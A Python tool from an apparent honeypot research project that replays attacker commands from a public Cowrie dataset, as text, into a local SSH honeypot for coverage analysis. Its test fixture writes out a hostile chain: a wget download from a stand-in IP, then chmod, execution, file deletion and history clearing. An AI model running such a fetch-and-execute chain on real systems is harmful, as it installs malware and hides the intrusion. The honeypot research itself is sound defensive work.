"""Cowrie ``input.csv`` replay bridge —— 用真實攻擊流量餵 easypot。

設計血緣
--------
承 analyzer（HANDOFF §17）那輪：analyzer 需要真實 ``_merged.jsonl`` 才有數字可算。
這支把公開 Cowrie 捕獲資料集（Kaggle "Medium-interaction SSH honeypot data"，
與論文 §4 Table 3 [38] 同源）的 ``input.csv`` replay 進本地 easypot，讓蜜罐正常
處理（規則/LLM）並 emit CommandEvent(hit/miss)，collector 落地後交給 analyze.py。

為何吃 input.csv 而非 json_log / cowrie.db
------------------------------------------
資料集已把 Cowrie 事件攤平成表格。``input.csv`` 三個欄位就夠組出 replay 所需的
「每條真實 session 依序打了哪些命令」：
  * session   —— 分組 key（一個 Cowrie session = 一條 easypot 連線，時間線對齊）
  * timestamp —— 組內排序（ISO8601，字串排序即時序）
  * input     —— 攻擊者原始命令列（**整行原樣送，不拆 ';'**，讓蜜罐 parser 處理
                 複雜攻擊鏈，如 wget;chmod;./exec，才測得準覆蓋度）
其餘欄位（id, realm）與其他 csv（sessions/auth/...）replay 不需要。

安全與隱私
----------
  * replay 把命令**當文字**送進你自己的蜜罐，不在本機執行任何攻擊。
  * 只連本地 target（預設 127.0.0.1:2222），不碰外網。
  * 不讀、不落地任何真實攻擊者 IP：easypot 端的 session 來源是 replay 客戶端
    自己的 localhost，與原始資料集的攻擊者 IP 無關（也不該混淆）。
  * 資料集的 files/ 目錄含真實惡意樣本——本工具完全不碰它。

相依
----
只用 asyncssh（transport 既有相依）。解析層純 stdlib，與 collector/analyzer 一致。

用法
----
    # 免真資料，用內建 fixture 驗證 pipeline 通
    python -m honeyshell.replay_cowrie --fixture

    # 真資料，先跑前 20 個 session 試水
    python -m honeyshell.replay_cowrie input.csv --limit 20 --delay 0.1

    # 全量
    python -m honeyshell.replay_cowrie input.csv --user root --password admin
"""

from __future__ import annotations

import argparse
import asyncio
import csv
import io
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Iterable, Optional

__all__ = [
    "ReplaySession",
    "parse_cowrie_input",
    "split_targets",
    "Target",
    "FIXTURE_CSV",
    "replay",
    "replay_multi",
    "main",
]


# --------------------------------------------------------------------------- #
# 解析（純函式，好測）
# --------------------------------------------------------------------------- #

@dataclass
class ReplaySession:
    """一條待 replay 的攻擊 session：一個 session id + 依時序的命令列。"""

    session_id: str
    commands: list[str] = field(default_factory=list)


def parse_cowrie_input(
    text: str,
    *,
    limit: Optional[int] = None,
) -> tuple[list[ReplaySession], int]:
    """解析 Cowrie ``input.csv`` 文字，回傳 ``(sessions, skipped_rows)``。

    * 自動偵測分隔符（此資料集為 TAB；容忍逗號）。
    * 按 ``session`` 分組，組內依 ``timestamp`` 字串排序（ISO8601 可直接字串比較）。
    * 空 ``input``、缺欄位的列計入 skipped，不中斷（與專案容錯紀律一致）。
    * ``limit`` 限制回傳的 session 數（取最早出現的前 N 個），供小量試跑。

    以文字為輸入（非路徑）讓單元測試直接餵字串，不必造暫存檔。
    """
    if not text.strip():
        return [], 0

    # 偵測分隔符：優先 TAB（此資料集），退回逗號。
    sample = text.splitlines()[0] if text.splitlines() else ""
    delimiter = "\t" if "\t" in sample else ","

    reader = csv.DictReader(io.StringIO(text), delimiter=delimiter)
    # 保留首次出現順序，讓 --limit 取「最早的 N 個 session」而非隨機。
    order: list[str] = []
    grouped: dict[str, list[tuple[str, str]]] = {}
    skipped = 0

    for row in reader:
        sid = (row.get("session") or "").strip()
        cmd = row.get("input")
        ts = (row.get("timestamp") or "").strip()
        if not sid or cmd is None or cmd.strip() == "":
            skipped += 1
            continue
        if sid not in grouped:
            grouped[sid] = []
            order.append(sid)
        grouped[sid].append((ts, cmd))

    if limit is not None:
        order = order[:limit]

    sessions: list[ReplaySession] = []
    for sid in order:
        rows = sorted(grouped[sid], key=lambda t: t[0])  # by timestamp string
        sessions.append(
            ReplaySession(session_id=sid, commands=[c for _, c in rows])
        )
    return sessions, skipped


# --------------------------------------------------------------------------- #
# 內建 fixture —— 免真資料就能跑通 pipeline / CI
# --------------------------------------------------------------------------- #

# 刻意涵蓋三種情境：
#   * 複雜攻擊鏈（wget;chmod;./exec）—— 測規則覆蓋 + 落 LLM 的邊界
#   * 亂數檔名植入物（/bin/xxxx）—— 必然 miss，證明 LLM 有存在價值
#   * 純偵察（whoami/uname/ls）—— 規則命中，壓低 miss rate
# TAB 分隔，欄位與真實 input.csv 對齊。
FIXTURE_CSV = (
    "id\tsession\ttimestamp\trealm\tinput\n"
    "1\tsess_aaaa\t2022-11-15T15:22:02.000Z\t\twhoami\n"
    "2\tsess_aaaa\t2022-11-15T15:22:03.000Z\t\tuname -a\n"
    "3\tsess_aaaa\t2022-11-15T15:22:04.000Z\t\t"
    "wget http://192.0.2.10:88/x; chmod +x x; ./x; rm -rf a.sh; history -c;\n"
    "4\tsess_bbbb\t2022-11-15T15:25:00.000Z\t\tls -la\n"
    "5\tsess_bbbb\t2022-11-15T15:25:01.000Z\t\t/bin/eyshcjdmzg\n"
    "6\tsess_bbbb\t2022-11-15T15:25:02.000Z\t\tcat /proc/cpuinfo\n"
)


# --------------------------------------------------------------------------- #
# Replay 客戶端（asyncssh）
# --------------------------------------------------------------------------- #

async def _replay_one(
    session: ReplaySession,
    *,
    host: str,
    port: int,
    username: str,
    password: str,
    delay: float,
    read_timeout: float,
) -> None:
    """對單一 session 開一條 SSH 連線，依序送命令。

    一個 Cowrie session ↔ 一條 easypot SSH 連線 ↔ easypot 內一個 session_id，
    這樣 analyzer 的 session 時間線與原始攻擊一一對應。

    以互動式 shell（請求 PTY）驅動，貼近真實攻擊者操作，且會走到蜜罐的
    prompt loop（而非 exec 單發），把 hit/miss emit 完整觸發。
    """
    import asyncssh  # lazy: 與 transport 一致，解析層不需要 asyncssh

    async with asyncssh.connect(
        host,
        port=port,
        username=username,
        password=password,
        known_hosts=None,          # 蜜罐 host key 每次可能不同，不驗
        client_keys=None,
    ) as conn:
        proc = await conn.create_process(term_type="xterm")  # 請求 PTY → 互動 shell
        try:
            for cmd in session.commands:
                proc.stdin.write(cmd + "\n")
                if delay > 0:
                    await asyncio.sleep(delay)
                # 盡量把這條命令的輸出讀掉（best-effort，不因超時中斷 replay）。
                try:
                    await asyncio.wait_for(_drain(proc), timeout=read_timeout)
                except asyncio.TimeoutError:
                    pass
            # 收尾：直接 EOF 關閉 stdin，不送字面 "exit"（否則會被記成一條
            # 攻擊命令，污染 analyzer 的命令統計）。蜜罐 readline 收到 EOF
            # 即結束 session。
            proc.stdin.write_eof()
        finally:
            try:
                await asyncio.wait_for(proc.wait_closed(), timeout=read_timeout)
            except (asyncio.TimeoutError, Exception):  # noqa: BLE001
                proc.close()


async def _drain(proc) -> None:
    """讀掉目前可得的 stdout，直到短暫無資料。best-effort。"""
    try:
        # 讀一小塊；蜜罐回應通常很快。讀不到就讓上層 timeout 收尾。
        while True:
            chunk = await proc.stdout.read(4096)
            if not chunk:
                return
    except Exception:  # noqa: BLE001 — 讀取問題不該中斷 replay
        return


async def replay(
    sessions: list[ReplaySession],
    *,
    host: str = "127.0.0.1",
    port: int = 2222,
    username: str = "root",
    password: str = "admin",
    delay: float = 0.05,
    read_timeout: float = 3.0,
    concurrency: int = 1,
    on_progress=None,
) -> int:
    """依序（或有限併發）replay 所有 session。回傳成功送出的 session 數。

    預設 concurrency=1（逐條），對蜜罐最溫和、時間線最乾淨。調高可加速大量
    replay，但別把本地蜜罐灌爆。
    """
    sem = asyncio.Semaphore(max(1, concurrency))
    done = 0

    async def _guarded(idx: int, s: ReplaySession) -> None:
        nonlocal done
        async with sem:
            try:
                await _replay_one(
                    s, host=host, port=port, username=username,
                    password=password, delay=delay, read_timeout=read_timeout,
                )
                done += 1
            except Exception as exc:  # noqa: BLE001 — 單 session 失敗不拖垮整體
                if on_progress:
                    on_progress(idx, s, exc)
                return
            if on_progress:
                on_progress(idx, s, None)

    await asyncio.gather(
        *(_guarded(i, s) for i, s in enumerate(sessions))
    )
    return done


# --------------------------------------------------------------------------- #
# 多 target 分流（B+C：docker 版把流量分散到 host1/host2）
# --------------------------------------------------------------------------- #

@dataclass
class Target:
    """一個 replay 目標蜜罐。``label`` 僅供進度輸出辨識（如 host1）。"""

    host: str
    port: int
    label: str = ""

    @classmethod
    def parse(cls, spec: str) -> "Target":
        """從 ``host:port`` 解析；缺 port 補 2222。label 預設取 host:port。"""
        if ":" in spec:
            host, port_s = spec.rsplit(":", 1)
            port = int(port_s)
        else:
            host, port = spec, 2222
        return cls(host=host, port=port, label=f"{host}:{port}")


def split_targets(
    sessions: list[ReplaySession],
    n_targets: int,
) -> list[list[ReplaySession]]:
    """把 session 按 **round-robin** 分成 ``n_targets`` 組。

    **關鍵：以 session 為原子單位分流，不切分單一 session 的命令。**
    一個 Cowrie session = 一條完整攻擊鏈（登入→偵察→植入後門），必須整條落在
    同一台蜜罐，否則攻擊鏈被拆散（host1 見 wget、host2 見 chmod）、VFS 狀態不連貫、
    session 時間線失去意義。

    用 round-robin（``session[i] → bucket[i % n]``）而非前半/後半，讓兩台流量
    分布均勻，避免「前半剛好都是簡單偵察」造成 per-source miss rate 偏差——這樣
    兩台的 miss rate 才可公正對比（驗證「同一設計、多台部署」的規模化論述）。

    純函式，不碰網路，好單測。``n_targets<=1`` 時回傳單一組（等同不分流）。
    """
    n = max(1, n_targets)
    buckets: list[list[ReplaySession]] = [[] for _ in range(n)]
    for i, s in enumerate(sessions):
        buckets[i % n].append(s)
    return buckets


async def replay_multi(
    sessions: list[ReplaySession],
    targets: list[Target],
    *,
    username: str = "root",
    password: str = "admin",
    delay: float = 0.05,
    read_timeout: float = 3.0,
    concurrency: int = 1,
    on_progress=None,
) -> dict[str, int]:
    """把 session round-robin 分流到多個 target，各自並行 replay。

    回傳 ``{target_label: done_count}``。單一 target 時退化為對 ``replay`` 的
    一次呼叫（行為與舊版一致）。多 target 時各組獨立跑，彼此不共享 semaphore
    ——每台各自 ``concurrency`` 條並行，貼近「N 台蜜罐同時承受流量」的真實情形。

    ``on_progress(idx, session, exc, label)`` 比單 target 版多一個 ``label``
    參數，讓呼叫端能標示每條打到哪台。
    """
    buckets = split_targets(sessions, len(targets))
    results: dict[str, int] = {}

    async def _run_bucket(target: Target, group: list[ReplaySession]) -> None:
        sem = asyncio.Semaphore(max(1, concurrency))
        done = 0

        async def _guarded(idx: int, s: ReplaySession) -> None:
            nonlocal done
            async with sem:
                try:
                    await _replay_one(
                        s, host=target.host, port=target.port,
                        username=username, password=password,
                        delay=delay, read_timeout=read_timeout,
                    )
                    done += 1
                except Exception as exc:  # noqa: BLE001 — 單 session 失敗不拖垮
                    if on_progress:
                        on_progress(idx, s, exc, target.label)
                    return
                if on_progress:
                    on_progress(idx, s, None, target.label)

        await asyncio.gather(*(_guarded(i, s) for i, s in enumerate(group)))
        results[target.label] = done

    await asyncio.gather(
        *(_run_bucket(t, g) for t, g in zip(targets, buckets))
    )
    return results


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def _read_text(path: str) -> str:
    if path == "-":
        return sys.stdin.read()
    return Path(path).read_text(encoding="utf-8", errors="replace")


def main(argv: Optional[list[str]] = None) -> int:
    p = argparse.ArgumentParser(
        prog="honeyshell.replay_cowrie",
        description="Replay Cowrie input.csv 進本地 easypot 蜜罐。",
    )
    src = p.add_mutually_exclusive_group(required=True)
    src.add_argument("csv_path", nargs="?", help="Cowrie input.csv 路徑（'-' 讀 stdin）")
    src.add_argument("--fixture", action="store_true",
                     help="用內建合成 fixture（免真資料，驗證 pipeline）")

    p.add_argument("--target", action="append", metavar="HOST:PORT",
                   help="蜜罐位址 host:port（預設 127.0.0.1:2222）。可重複給多個 "
                        "--target，session 會 round-robin 分流到各台（B+C 用）。")
    p.add_argument("--user", default="root", help="登入帳號（蜜罐接受任意值）")
    p.add_argument("--password", default="admin", help="登入密碼（蜜罐接受任意值）")
    p.add_argument("--limit", type=int, default=None,
                   help="只 replay 最早的 N 個 session（試跑用）")
    p.add_argument("--delay", type=float, default=0.05,
                   help="命令間隔秒數（預設 0.05）")
    p.add_argument("--read-timeout", type=float, default=3.0,
                   help="每條命令回應讀取上限秒數（預設 3.0）")
    p.add_argument("--concurrency", type=int, default=1,
                   help="同時 replay 的 session 數（預設 1，逐條最乾淨）")
    p.add_argument("--dry-run", action="store_true",
                   help="只解析並印出 session/命令統計，不實際連線")
    args = p.parse_args(argv)

    text = FIXTURE_CSV if args.fixture else _read_text(args.csv_path)
    sessions, skipped = parse_cowrie_input(text, limit=args.limit)
    total_cmds = sum(len(s.commands) for s in sessions)

    print(f"解析：{len(sessions)} 個 session、{total_cmds} 條命令"
          f"（略過 {skipped} 列）", file=sys.stderr)

    # --target 用 append：不給任何 --target 時 args.target 為 None，補預設，
    # 確保「不帶 --target」行為與舊版完全一致（單機 127.0.0.1:2222）。
    target_specs = args.target or ["127.0.0.1:2222"]
    targets = [Target.parse(t) for t in target_specs]

    if len(targets) > 1:
        buckets = split_targets(sessions, len(targets))
        print("分流：" + "、".join(
            f"{t.label}={len(b)} session"
            for t, b in zip(targets, buckets)
        ), file=sys.stderr)

    if args.dry_run:
        for s in sessions[:20]:
            print(f"  [{s.session_id}] {len(s.commands)} 命令："
                  f"{s.commands[0][:60] if s.commands else ''}…", file=sys.stderr)
        return 0

    def _progress(idx: int, s: ReplaySession, exc: Optional[Exception],
                  label: str) -> None:
        tag = f" →{label}" if len(targets) > 1 else ""
        if exc is not None:
            print(f"  ✗ session {s.session_id}{tag}: {exc!r}", file=sys.stderr)
        else:
            print(f"  ✓ {s.session_id} ({len(s.commands)} 命令){tag}",
                  file=sys.stderr)

    try:
        results = asyncio.run(replay_multi(
            sessions, targets,
            username=args.user, password=args.password,
            delay=args.delay, read_timeout=args.read_timeout,
            concurrency=args.concurrency, on_progress=_progress,
        ))
    except KeyboardInterrupt:
        print("中斷。", file=sys.stderr)
        return 130

    done = sum(results.values())
    if len(targets) > 1:
        detail = "、".join(f"{lbl} {n}" for lbl, n in sorted(results.items()))
        print(f"完成：{done}/{len(sessions)} session replay 成功（{detail}）。",
              file=sys.stderr)
    else:
        print(f"完成：{done}/{len(sessions)} session replay 成功。",
              file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
